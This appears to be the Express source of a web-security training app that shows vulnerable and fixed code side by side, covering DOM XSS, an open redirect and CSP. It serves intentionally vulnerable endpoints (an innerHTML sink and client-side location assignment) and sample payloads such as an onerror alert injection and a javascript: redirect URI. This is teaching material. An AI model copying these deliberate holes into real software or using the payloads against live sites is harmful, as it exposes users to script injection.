const express = require("express");
const crypto = require("crypto");
const app = express();

app.set("query parser", "extended");

// Shared styles for code blocks
const PRE = 'style="background:#1e1e1e;color:#d4d4d4;padding:1rem;border-radius:6px;overflow-x:auto;font-size:0.9em;"';

// HTML escape function (used in Labs 4-6)
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/* ========================================================================
   NAVIGATION DATA — sidebar structure
   ======================================================================== */
const LAB_NAV = [
  { category: "XSS & Client-Side", labs: [
    { num: 1, title: "DOM XSS", path: "/dom-xss" },
    { num: 2, title: "Open Redirect", path: "/vuln-redirect" },
    { num: 3, title: "CSP", path: "/csp-none" },
    { num: 4, title: "EJS Template Engine", path: "/ejs-escaped" },
    { num: 5, title: "Stored XSS", path: "/stored-xss" },
    { num: 6, title: "Reflected XSS", path: "/reflected" },
    { num: 7, title: "Cookie Theft + HttpOnly", path: "/cookie-theft" },
    { num: 8, title: "Postmessage XSS", path: "/postmessage-xss" },
    { num: 9, title: "JSON Injection", path: "/json-injection" },
    { num: 10, title: "URL Parsing Confusion", path: "/url-confusion" },
    { num: 11, title: "DOMPurify Sanitizer", path: "/dompurify-demo" },
    { num: 12, title: "DOM Clobbering", path: "/dom-clobbering" },
    { num: 13, title: "Mutation XSS", path: "/mxss" },
    { num: 14, title: "Prototype Pollution \u2192 XSS", path: "/proto-pollution-xss" },
    { num: 15, title: "Dangling Markup", path: "/dangling-markup" },
    { num: 16, title: "Trusted Types", path: "/trusted-types" },
    { num: 17, title: "SRI", path: "/sri-demo" },
    { num: 18, title: "Sandbox Iframes", path: "/sandbox-iframe" },
    { num: 19, title: "Security Headers Audit", path: "/headers-audit" },
  ]},
  { category: "Injection Attacks", labs: [
    { num: 20, title: "SQL Injection", cwe: "89", path: "/sqli" },
    { num: 21, title: "Command Injection", cwe: "78", path: "/cmdi" },
    { num: 22, title: "SSTI", cwe: "1336", path: "/ssti" },
  ]},
  { category: "Broken Access & Trust", labs: [
    { num: 23, title: "CSRF", cwe: "352", path: "/csrf" },
    { num: 24, title: "IDOR", cwe: "639", path: "/idor" },
    { num: 25, title: "Mass Assignment", cwe: "915", path: "/mass-assign" },
    { num: 26, title: "JWT Weaknesses", cwe: "347", path: "/jwt-demo" },
  ]},
  { category: "Server-Side", labs: [
    { num: 27, title: "Path Traversal", cwe: "22", path: "/path-traversal" },
    { num: 28, title: "SSRF", cwe: "918", path: "/ssrf" },
    { num: 29, title: "XXE", cwe: "611", path: "/xxe" },
  ]},
  { category: "HTTP & Browser", labs: [
    { num: 30, title: "CORS Misconfiguration", cwe: "942", path: "/cors-misconfig" },
    { num: 31, title: "Clickjacking", cwe: "1021", path: "/clickjack" },
    { num: 32, title: "CRLF Injection", cwe: "113", path: "/crlf" },
  ]},
  { category: "Application Logic", labs: [
    { num: 33, title: "Deserialization", cwe: "502", path: "/deserialize" },
    { num: 34, title: "ReDoS", cwe: "1333", path: "/redos" },
    { num: 35, title: "Insecure Randomness", cwe: "330", path: "/weak-random" },
    { num: 36, title: "Error Leaks", cwe: "200", path: "/error-leak" },
    { num: 37, title: "Race Conditions", cwe: "362", path: "/race-condition" },
  ]},
  { category: "Crypto & Input Handling", labs: [
    { num: 38, title: "HTTP Parameter Pollution", cwe: "235", path: "/hpp" },
    { num: 39, title: "Insecure Password Storage", cwe: "916", path: "/weak-password" },
    { num: 40, title: "Host Header Injection", cwe: "644", path: "/host-header" },
    { num: 41, title: "Prototype Pollution", cwe: "1321", path: "/proto-pollution" },
    { num: 42, title: "Timing Attack", cwe: "208", path: "/timing-attack" },
    { num: 43, title: "File Upload", cwe: "434", path: "/file-upload" },
  ]},
];

// Build a flat list of all lab paths for matching
const ALL_LAB_PATHS = [];
LAB_NAV.forEach(cat => cat.labs.forEach(lab => ALL_LAB_PATHS.push(lab)));

function findCurrentLab(reqPath) {
  const clean = reqPath.split("?")[0];
  // Direct match on primary path
  let match = ALL_LAB_PATHS.find(l => clean === l.path);
  if (match) return match;
  // Match fixed variants (e.g. /sqli-fixed -> lab 20)
  const base = clean.replace(/-fixed$/, "").replace(/-none$/, "").replace(/-strict$/, "")
    .replace(/-nonce$/, "").replace(/-report-only$/, "").replace(/-unsafe-inline$/, "")
    .replace(/-raw$/, "").replace(/-escaped$/, "").replace(/-with-csp$/, "")
    .replace(/-tampered$/, "").replace(/-attacker$/, "");
  match = ALL_LAB_PATHS.find(l => base === l.path);
  return match || null;
}

function renderSidebar(currentPath) {
  const current = findCurrentLab(currentPath);
  return LAB_NAV.map(cat => `
    <div class="nav-category">
      <div class="nav-category-title">${cat.category}</div>
      ${cat.labs.map(lab => {
        const active = current && current.num === lab.num ? ' active' : '';
        return `<a class="nav-lab${active}" href="${lab.path}">
          <span class="nav-num">${lab.num}</span> ${lab.title}
          ${lab.cwe ? `<span class="nav-cwe">CWE-${lab.cwe}</span>` : ''}
        </a>`;
      }).join('')}
    </div>
  `).join('');
}

function getPrevNext(currentPath) {
  const current = findCurrentLab(currentPath);
  if (!current) return { prev: null, next: null };
  const flat = ALL_LAB_PATHS;
  const idx = flat.findIndex(l => l.num === current.num);
  return {
    prev: idx > 0 ? flat[idx - 1] : null,
    next: idx < flat.length - 1 ? flat[idx + 1] : null,
  };
}

const SHARED_CSS = `
<style>
  *, *::before, *::after { box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
    margin: 0; padding: 0;
    background: #fff; color: #1a1a2e;
    display: flex; min-height: 100vh;
  }

  /* Sidebar */
  .sidebar {
    width: 280px; min-width: 280px;
    background: #f8f9fa;
    border-right: 1px solid #e1e4e8;
    overflow-y: auto;
    position: sticky; top: 0;
    height: 100vh;
    padding: 0;
    font-size: 0.875rem;
  }
  .sidebar-header {
    padding: 1.25rem 1rem;
    border-bottom: 1px solid #e1e4e8;
    background: #fff;
  }
  .sidebar-header h1 {
    margin: 0; font-size: 1.1rem; font-weight: 700;
    color: #1a1a2e;
  }
  .sidebar-header p {
    margin: 0.25rem 0 0; font-size: 0.75rem; color: #666;
  }
  .nav-category { padding: 0.5rem 0; }
  .nav-category-title {
    padding: 0.5rem 1rem 0.25rem;
    font-size: 0.7rem; font-weight: 600;
    text-transform: uppercase; letter-spacing: 0.05em;
    color: #8b949e;
  }
  .nav-lab {
    display: flex; align-items: center; gap: 0.5rem;
    padding: 0.35rem 1rem;
    color: #444; text-decoration: none;
    border-left: 3px solid transparent;
    transition: all 0.15s;
    font-size: 0.82rem; line-height: 1.3;
  }
  .nav-lab:hover { background: #e8eaed; color: #1a1a2e; }
  .nav-lab.active {
    background: #e3edf7; color: #0550ae;
    border-left-color: #0550ae; font-weight: 600;
  }
  .nav-num {
    display: inline-flex; align-items: center; justify-content: center;
    min-width: 1.5rem; height: 1.3rem;
    background: #e1e4e8; border-radius: 3px;
    font-size: 0.7rem; font-weight: 600; color: #666;
    flex-shrink: 0;
  }
  .nav-lab.active .nav-num { background: #0550ae; color: #fff; }
  .nav-cwe {
    margin-left: auto; font-size: 0.65rem;
    color: #8b949e; font-family: monospace;
  }

  /* Main content */
  .main-content {
    flex: 1; min-width: 0;
    padding: 2rem 2.5rem;
    max-width: 960px;
  }

  /* Hamburger for mobile */
  .hamburger {
    display: none; position: fixed; top: 0.75rem; left: 0.75rem;
    z-index: 1000; background: #fff; border: 1px solid #e1e4e8;
    border-radius: 6px; padding: 0.5rem 0.6rem;
    cursor: pointer; font-size: 1.2rem; line-height: 1;
  }

  /* Prev/Next navigation */
  .lab-nav {
    display: flex; justify-content: space-between;
    margin-top: 2rem; padding-top: 1.5rem;
    border-top: 1px solid #e1e4e8;
  }
  .lab-nav a {
    color: #0550ae; text-decoration: none; font-size: 0.9rem;
  }
  .lab-nav a:hover { text-decoration: underline; }

  /* Legacy styles (preserve existing lab content) */
  .main-content section { margin: 1.5rem 0; }
  .main-content a.vuln { color: #c00; }
  .main-content a.safe { color: #070; }
  .main-content .info { color: #555; font-size: 0.9em; }
  code { background: #f0f0f0; padding: 2px 6px; border-radius: 3px; font-size: 0.9em; }
  details { margin: 1rem 0; }
  details summary { cursor: pointer; font-weight: 600; }
  details[open] summary { margin-bottom: 0.5rem; }
  pre { overflow-x: auto; }

  /* Index page cards */
  .lab-grid { display: grid; gap: 0.75rem; }
  .lab-card {
    display: block; padding: 1rem 1.25rem;
    border: 1px solid #e1e4e8; border-radius: 8px;
    text-decoration: none; color: inherit;
    transition: all 0.15s; border-left: 4px solid #e1e4e8;
  }
  .lab-card:hover {
    border-color: #d0d7de; box-shadow: 0 1px 3px rgba(0,0,0,0.08);
    transform: translateY(-1px);
  }
  .lab-card h3 { margin: 0 0 0.25rem; font-size: 0.95rem; color: #1a1a2e; }
  .lab-card .card-meta {
    font-size: 0.75rem; color: #666;
    display: flex; gap: 0.75rem; align-items: center;
  }
  .lab-card .card-meta .cwe { font-family: monospace; color: #8b949e; }
  .lab-card .card-links { margin-top: 0.5rem; font-size: 0.8rem; }
  .lab-card .card-links a { margin-right: 1rem; }

  /* Category colors for card borders */
  .cat-xss { border-left-color: #cf222e; }
  .cat-injection { border-left-color: #e16f24; }
  .cat-access { border-left-color: #8250df; }
  .cat-server { border-left-color: #0550ae; }
  .cat-http { border-left-color: #1a7f37; }
  .cat-logic { border-left-color: #bf8700; }
  .cat-crypto { border-left-color: #0969da; }

  /* Split pane for lab pages */
  .split-pane {
    display: grid; grid-template-columns: 1fr 1fr;
    gap: 1rem; margin: 1rem 0;
  }
  .pane {
    border: 1px solid #e1e4e8; border-radius: 8px;
    overflow: hidden;
  }
  .pane-header {
    padding: 0.5rem 1rem; font-weight: 600; font-size: 0.85rem;
    border-bottom: 1px solid #e1e4e8;
  }
  .pane-vuln .pane-header { background: #fff5f5; color: #cf222e; border-left: 3px solid #cf222e; }
  .pane-safe .pane-header { background: #f0fff4; color: #1a7f37; border-left: 3px solid #1a7f37; }
  .pane-body { padding: 1rem; }
  .pane-body pre { margin: 0; }

  /* Breadcrumb */
  .breadcrumb {
    font-size: 0.8rem; color: #666; margin-bottom: 1rem;
  }
  .breadcrumb a { color: #0550ae; text-decoration: none; }
  .breadcrumb a:hover { text-decoration: underline; }

  /* Dark mode toggle */
  .theme-toggle {
    background: none; border: 1px solid #d0d7de; border-radius: 6px;
    padding: 0.3rem 0.5rem; cursor: pointer; font-size: 1rem;
    line-height: 1; color: inherit;
  }
  .theme-toggle:hover { background: #e8eaed; }

  /* Dark mode */
  [data-theme="dark"] {
    color-scheme: dark;
  }
  [data-theme="dark"] body { background: #0d1117; color: #c9d1d9; }
  [data-theme="dark"] .sidebar { background: #161b22; border-right-color: #30363d; }
  [data-theme="dark"] .sidebar-header { background: #0d1117; border-bottom-color: #30363d; }
  [data-theme="dark"] .sidebar-header h1 { color: #c9d1d9; }
  [data-theme="dark"] .nav-category-title { color: #8b949e; }
  [data-theme="dark"] .nav-lab { color: #c9d1d9; }
  [data-theme="dark"] .nav-lab:hover { background: #21262d; color: #f0f6fc; }
  [data-theme="dark"] .nav-lab.active { background: #1f3a5f; color: #58a6ff; border-left-color: #58a6ff; }
  [data-theme="dark"] .nav-num { background: #30363d; color: #8b949e; }
  [data-theme="dark"] .nav-lab.active .nav-num { background: #58a6ff; color: #0d1117; }
  [data-theme="dark"] .main-content { color: #c9d1d9; }
  [data-theme="dark"] .breadcrumb a { color: #58a6ff; }
  [data-theme="dark"] .lab-nav a { color: #58a6ff; }
  [data-theme="dark"] code { background: #21262d; color: #c9d1d9; }
  [data-theme="dark"] .lab-card { border-color: #30363d; background: #161b22; }
  [data-theme="dark"] .lab-card:hover { border-color: #484f58; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
  [data-theme="dark"] .lab-card h3 { color: #c9d1d9; }
  [data-theme="dark"] .lab-card .card-meta { color: #8b949e; }
  [data-theme="dark"] .pane { border-color: #30363d; }
  [data-theme="dark"] .pane-header { border-bottom-color: #30363d; }
  [data-theme="dark"] .pane-vuln .pane-header { background: #2d1215; color: #f85149; }
  [data-theme="dark"] .pane-safe .pane-header { background: #0f2d16; color: #3fb950; }
  [data-theme="dark"] .main-content a.vuln { color: #f85149; }
  [data-theme="dark"] .main-content a.safe { color: #3fb950; }
  [data-theme="dark"] .main-content .info { color: #8b949e; }
  [data-theme="dark"] .hamburger { background: #161b22; border-color: #30363d; color: #c9d1d9; }
  [data-theme="dark"] .theme-toggle { border-color: #30363d; }
  [data-theme="dark"] .theme-toggle:hover { background: #21262d; }
  [data-theme="dark"] details summary { color: #c9d1d9; }
  [data-theme="dark"] hr { border-color: #30363d; }
  [data-theme="dark"] table { color: #c9d1d9; }
  [data-theme="dark"] td, [data-theme="dark"] th { border-color: #30363d !important; }
  [data-theme="dark"] .lab-nav { border-top-color: #30363d; }
  [data-theme="dark"] input, [data-theme="dark"] textarea, [data-theme="dark"] select {
    background: #0d1117; color: #c9d1d9; border: 1px solid #30363d;
  }
  [data-theme="dark"] button { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }

  /* Responsive */
  @media (max-width: 768px) {
    .sidebar {
      position: fixed; left: -300px; top: 0;
      z-index: 999; transition: left 0.3s;
      box-shadow: 2px 0 8px rgba(0,0,0,0.1);
    }
    .sidebar.open { left: 0; }
    .hamburger { display: block; }
    .main-content { padding: 1rem; padding-top: 3.5rem; }
    .split-pane { grid-template-columns: 1fr; }
  }
</style>`;

function renderLayout(bodyContent, reqPath) {
  const isIndex = reqPath === "/";
  const current = findCurrentLab(reqPath);
  const { prev, next } = getPrevNext(reqPath);

  const breadcrumb = current ? `
    <div class="breadcrumb">
      <a href="/">Labs</a> &rsaquo;
      ${LAB_NAV.find(c => c.labs.some(l => l.num === current.num))?.category || ''}
      &rsaquo; Lab ${current.num}
    </div>
  ` : '';

  const prevNext = current ? `
    <div class="lab-nav">
      ${prev ? `<a href="${prev.path}">&larr; Lab ${prev.num}: ${prev.title}</a>` : '<span></span>'}
      ${next ? `<a href="${next.path}">Lab ${next.num}: ${next.title} &rarr;</a>` : '<span></span>'}
    </div>
  ` : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${current ? `Lab ${current.num}: ${current.title}` : 'Web Vuln by Example'} — Web Vuln by Example</title>
  <script>
    // Apply saved theme immediately to prevent flash
    (function() {
      var t = localStorage.getItem('theme');
      if (t === 'dark' || (!t && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        document.documentElement.setAttribute('data-theme', 'dark');
      }
    })();
  </script>
  ${SHARED_CSS}
</head>
<body>
  <button class="hamburger" onclick="document.querySelector('.sidebar').classList.toggle('open')" aria-label="Toggle navigation">&#9776;</button>
  <nav class="sidebar">
    <div class="sidebar-header">
      <div style="display:flex;align-items:center;justify-content:space-between;">
        <h1><a href="/" style="color:inherit;text-decoration:none;">Web Vuln by Example</a></h1>
        <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle dark mode" title="Toggle dark mode">
          <span class="theme-icon"></span>
        </button>
      </div>
      <p>43 labs &middot; Attack + Defense</p>
    </div>
    ${renderSidebar(reqPath)}
  </nav>
  <main class="main-content">
    ${breadcrumb}
    ${bodyContent}
    ${!isIndex ? prevNext : ''}
  </main>
  <script>
    // Close sidebar on mobile when clicking a link
    document.querySelectorAll('.nav-lab').forEach(a => {
      a.addEventListener('click', () => {
        document.querySelector('.sidebar').classList.remove('open');
      });
    });

    // Dark mode toggle
    function toggleTheme() {
      var html = document.documentElement;
      var isDark = html.getAttribute('data-theme') === 'dark';
      if (isDark) {
        html.removeAttribute('data-theme');
        localStorage.setItem('theme', 'light');
      } else {
        html.setAttribute('data-theme', 'dark');
        localStorage.setItem('theme', 'dark');
      }
      updateThemeIcon();
    }
    function updateThemeIcon() {
      var isDark = document.documentElement.getAttribute('data-theme') === 'dark';
      document.querySelectorAll('.theme-icon').forEach(function(el) {
        el.textContent = isDark ? '\\u2600' : '\\u263e';
      });
    }
    updateThemeIcon();
  </script>
</body>
</html>`;
}

/* ========================================================================
   LAYOUT MIDDLEWARE — wraps all HTML responses in the shared layout
   ======================================================================== */
app.use((req, res, next) => {
  const origSend = res.send.bind(res);
  res.send = function(body) {
    const ct = res.get("Content-Type") || "";
    if (ct.includes("html") && typeof body === "string" && !body.includes("<!DOCTYPE")) {
      body = renderLayout(body, req.path);
    }
    return origSend(body);
  };
  next();
});

/* ========================================================================
   INDEX — lab directory
   ======================================================================== */
const CAT_CSS_CLASSES = {
  "XSS & Client-Side": "cat-xss",
  "Injection Attacks": "cat-injection",
  "Broken Access & Trust": "cat-access",
  "Server-Side": "cat-server",
  "HTTP & Browser": "cat-http",
  "Application Logic": "cat-logic",
  "Crypto & Input Handling": "cat-crypto",
};

app.get("/", (req, res) => {
  const labCards = LAB_NAV.map(cat => {
    const catClass = CAT_CSS_CLASSES[cat.category] || '';
    return `
      <h2 style="margin-top:1.5rem; font-size:1rem; color:#666; text-transform:uppercase; letter-spacing:0.03em;">
        ${cat.category}
      </h2>
      <div class="lab-grid">
        ${cat.labs.map(lab => `
          <a href="${lab.path}" class="lab-card ${catClass}">
            <h3>Lab ${lab.num} — ${lab.title}</h3>
            <div class="card-meta">
              ${lab.cwe ? `<span class="cwe">CWE-${lab.cwe}</span>` : ''}
            </div>
          </a>
        `).join('')}
      </div>
    `;
  }).join('');

  res.type("html").send(`
    <div style="margin-bottom:2rem;">
      <h1 style="margin:0 0 0.5rem;">Web Vuln by Example</h1>
      <p style="color:#666; margin:0; font-size:1rem;">
        43 hands-on labs. Vulnerable + fixed code side-by-side.<br>
        <code style="font-size:0.85rem;">npm install &amp;&amp; npm start</code>
      </p>
    </div>
    ${labCards}
  `);
});

/* ========================================================================
   LAB 1 — DOM XSS
   ======================================================================== */
app.get("/dom-xss", (req, res) => {
  res.type("html").send(`
    <h1>Lab 1a: DOM XSS — innerHTML (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <div id="output"></div>
    <script>
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").innerHTML = q;
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">URLSearchParams</span>(<span style="color:#4ec9b0;">window</span>.location.search).<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"q"</span>);

<span style="color:#6a9955;">// Source: window.location.search — untrusted user input</span>
<span style="color:#6a9955;">// The query string comes directly from the URL, which the attacker controls.</span>

document.<span style="color:#dcdcaa;">getElementById</span>(<span style="color:#ce9178;">"output"</span>)<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">.innerHTML = q;</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// Sink: innerHTML — parses the string as HTML</span>
<span style="color:#6a9955;">// The browser creates real DOM elements from the string.</span>
<span style="color:#6a9955;">// &lt;img src=x onerror=alert('XSS')&gt; becomes a real &lt;img&gt; element</span>
<span style="color:#6a9955;">// that fires its onerror handler as JavaScript.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker crafts a URL: <code>/dom-xss?q=&lt;img src=x onerror=alert('XSS')&gt;</code></li>
      <li>Victim clicks the link</li>
      <li>Browser reads <code>q</code> from the URL (<strong>source</strong>)</li>
      <li><code>innerHTML</code> parses it as HTML (<strong>sink</strong>)</li>
      <li><code>&lt;img&gt;</code> element is created, <code>src=x</code> fails, <code>onerror</code> fires JavaScript</li>
    </ol>

    <details>
      <summary>Why is this vulnerable?</summary>
      <p><code>innerHTML</code> parses the string as HTML, so
      <code>&lt;img src=x onerror=alert('XSS')&gt;</code> creates a real
      element that fires JavaScript.</p>
      <p><strong>The core issue:</strong> untrusted input (URL query string) flows
      into a dangerous sink (<code>innerHTML</code>) with no sanitization in between.</p>
    </details>
  `);
});

app.get("/fixed-dom", (req, res) => {
  res.type("html").send(`
    <h1>Lab 1b: DOM XSS — textContent (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <div id="output"></div>
    <script>
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").textContent = q;
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">URLSearchParams</span>(<span style="color:#4ec9b0;">window</span>.location.search).<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"q"</span>);

<span style="color:#6a9955;">// Same source — still reading untrusted input from the URL.</span>

document.<span style="color:#dcdcaa;">getElementById</span>(<span style="color:#ce9178;">"output"</span>)<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">.textContent = q;</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>

<span style="color:#6a9955;">// Safe sink: textContent treats the string as plain text.</span>
<span style="color:#6a9955;">// The browser does NOT parse HTML tags.</span>
<span style="color:#6a9955;">// &lt;img src=x onerror=alert('XSS')&gt; is displayed as literal text</span>
<span style="color:#6a9955;">// — no element is created, no JavaScript runs.</span></code></pre>

    <h3>What Changed (1 line)</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">element.innerHTML = q;    // parses HTML — dangerous</span>
<span style="color:#89d185;">element.textContent = q;  // plain text — safe</span></code></pre>

    <details>
      <summary>Why is this safe?</summary>
      <p><code>textContent</code> treats everything as plain text.
      HTML tags are displayed literally, not parsed.</p>
      <p><strong>The fix:</strong> Same untrusted input, but it flows into a
      <strong>safe sink</strong>. The browser never interprets it as HTML.</p>
      <p>Open DevTools → Elements and compare: instead of a real <code>&lt;img&gt;</code>
      element, you'll see a text node containing the raw string.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 2 — Open Redirect
   ======================================================================== */
app.get("/vuln-redirect", (req, res) => {
  const next = req.query.next;
  if (next !== "ok") {
    return res.status(400).send("next=ok is required");
  }
  res.type("html").send(`
    <h1>Lab 2a: Vulnerable Redirect</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Server validated <code>next</code>, but client uses <code>redirect_uri</code>.</p>
    <script>
      const u = new URLSearchParams(window.location.search).get("redirect_uri");
      if (u) location = u;
    </script>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code>app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/vuln-redirect"</span>, (req, res) =&gt; {
  <span style="color:#9cdcfe;">const</span> next = req.query.next;

  <span style="color:#6a9955;">// Server validates "next" — but this isn't what the client uses!</span>
  <span style="color:#c586c0;">if</span> (next !== <span style="color:#ce9178;">"ok"</span>) {
    <span style="color:#c586c0;">return</span> res.<span style="color:#dcdcaa;">status</span>(400).<span style="color:#dcdcaa;">send</span>(<span style="color:#ce9178;">"next=ok is required"</span>);
  }

  <span style="color:#6a9955;">// Server sends HTML with client-side redirect logic...</span>
});</code></pre>

    <h3>Client-Side Code (the bug)</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> u = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">URLSearchParams</span>(window.location.search).<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"redirect_uri"</span>);

<span style="color:#6a9955;">// Source: window.location.search — attacker controls this</span>
<span style="color:#6a9955;">// The server validated "next", but the client reads "redirect_uri"</span>
<span style="color:#6a9955;">// — a completely different parameter that was never checked.</span>

<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">location = u;</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// Sink: location assignment — navigates the browser</span>
<span style="color:#6a9955;">// javascript:alert('XSS') is a valid "URL" that executes JS</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker crafts: <code>/vuln-redirect?next=ok&amp;redirect_uri=javascript:alert('XSS')</code></li>
      <li>Server checks <code>next=ok</code> — passes validation</li>
      <li>Client reads <code>redirect_uri</code> — never validated by anyone</li>
      <li><code>location = "javascript:alert('XSS')"</code> executes JavaScript</li>
    </ol>

    <details>
      <summary>Why is this vulnerable?</summary>
      <p><strong>Broken trust boundary:</strong> The server validates parameter A,
      but the client uses parameter B. The attacker satisfies the server check
      while injecting a malicious value into the unchecked parameter.</p>
    </details>
  `);
});

app.get("/fixed-redirect", (req, res) => {
  const redirectUri = req.query.redirect_uri;
  const allowed = new Set(["http://localhost:3000/safe-landing"]);
  if (!allowed.has(redirectUri)) {
    const safeUri = escapeHtml(redirectUri);
    res.status(400).type("html").send(`
      <h1>Lab 2b: Fixed Redirect — Blocked</h1>
      <p><a href="/">Back to labs</a></p>
      <p>Redirect blocked: <code>${safeUri}</code> is not in the allowlist.</p>
      <hr>

      <h3>Server-Side Code</h3>
      <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> redirectUri = req.query.redirect_uri;

<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const allowed = new Set(["http://localhost:3000/safe-landing"]);</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>

<span style="color:#6a9955;">// Server-side allowlist: only pre-approved URLs are accepted.</span>
<span style="color:#6a9955;">// The redirect happens server-side via res.redirect(),</span>
<span style="color:#6a9955;">// not client-side via location = ...</span>

<span style="color:#c586c0;">if</span> (!allowed.<span style="color:#dcdcaa;">has</span>(redirectUri)) {
  <span style="color:#c586c0;">return</span> res.<span style="color:#dcdcaa;">status</span>(400).<span style="color:#dcdcaa;">send</span>(<span style="color:#ce9178;">"Invalid redirect_uri"</span>);
}
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.redirect(302, redirectUri);</span>  <span style="color:#6a9955;">// server controls the redirect</span></code></pre>

      <h3>What Changed</h3>
      <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">// Client reads redirect_uri from URL, assigns to location</span>
<span style="color:#f48771;text-decoration:line-through;">location = new URLSearchParams(...).get("redirect_uri");</span>

<span style="color:#89d185;">// Server validates redirect_uri against allowlist</span>
<span style="color:#89d185;">// Server performs the redirect itself via res.redirect()</span>
<span style="color:#89d185;">// No client-side JavaScript involved</span></code></pre>
    `);
    return;
  }
  return res.redirect(302, redirectUri);
});

app.get("/safe-landing", (req, res) => {
  res.type("html").send(`
    <h1>Safe Landing Page</h1>
    <p><a href="/">Back to labs</a></p>
  `);
});

/* ========================================================================
   LAB 3 — CSP (Content Security Policy)
   ======================================================================== */

// --- 3a: No CSP at all (baseline) ---
app.get("/csp-none", (req, res) => {
  res.type("html").send(`
    <h1>Lab 3a: No CSP (Baseline)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>No Content-Security-Policy header is set.</p>
    <p>Injected content below:</p>
    <div id="output"></div>
    <script>
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").innerHTML = q;
    </script>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code>app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/csp-none"</span>, (req, res) =&gt; {
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">// No CSP header set at all</span>  <span style="color:#f44747;">// &lt;-- THE PROBLEM</span>

  res.<span style="color:#dcdcaa;">type</span>(<span style="color:#ce9178;">"html"</span>).<span style="color:#dcdcaa;">send</span>(<span style="color:#ce9178;">&#96;...&#96;</span>);
});</code></pre>

    <h3>Response Headers</h3>
    <pre ${PRE}><code>HTTP/1.1 200 OK
Content-Type: text/html
<span style="color:#6a9955;">// No Content-Security-Policy header</span>
<span style="color:#6a9955;">// Browser allows ALL scripts, ALL sources, no restrictions</span></code></pre>

    <details>
      <summary>What's happening?</summary>
      <p>Without CSP, the browser has no restrictions. Any injected
      <code>&lt;img onerror&gt;</code> or <code>&lt;script&gt;</code> runs freely.</p>
      <p>This is the default state of most web apps — no CSP means the browser
      trusts everything the page contains.</p>
    </details>
  `);
});

// --- 3b: Strict CSP — blocks ALL inline scripts ---
app.get("/csp-strict", (req, res) => {
  res.set("Content-Security-Policy", "default-src 'self'; script-src 'none'");
  res.type("html").send(`
    <h1>Lab 3b: Strict CSP — script-src 'none'</h1>
    <p><a href="/">Back to labs</a></p>
    <p>CSP: <code>default-src 'self'; script-src 'none'</code></p>
    <p>Even our own scripts won't run. But the XSS is also blocked.</p>
    <div id="output"></div>
    <script>
      // This legitimate script is ALSO blocked by CSP
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").innerHTML = q;
    </script>
    <p><em>Check the browser console — you'll see a CSP violation error.</em></p>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code>app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/csp-strict"</span>, (req, res) =&gt; {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Content-Security-Policy", "default-src 'self'; script-src 'none'");</span>

  <span style="color:#6a9955;">// script-src 'none' = NO JavaScript allowed, period.</span>
  <span style="color:#6a9955;">// This blocks the attacker's scripts AND your own app scripts.</span>

  res.<span style="color:#dcdcaa;">type</span>(<span style="color:#ce9178;">"html"</span>).<span style="color:#dcdcaa;">send</span>(<span style="color:#ce9178;">&#96;...&#96;</span>);
});</code></pre>

    <h3>Response Headers</h3>
    <pre ${PRE}><code>HTTP/1.1 200 OK
Content-Type: text/html
<span style="color:#89d185;">Content-Security-Policy: default-src 'self'; script-src 'none'</span>

<span style="color:#6a9955;">// 'none' = absolutely no scripts from any source</span>
<span style="color:#6a9955;">// Even &lt;script&gt; tags in the page itself are blocked</span></code></pre>

    <details>
      <summary>What's happening?</summary>
      <p><code>script-src 'none'</code> blocks ALL JavaScript — inline and external.
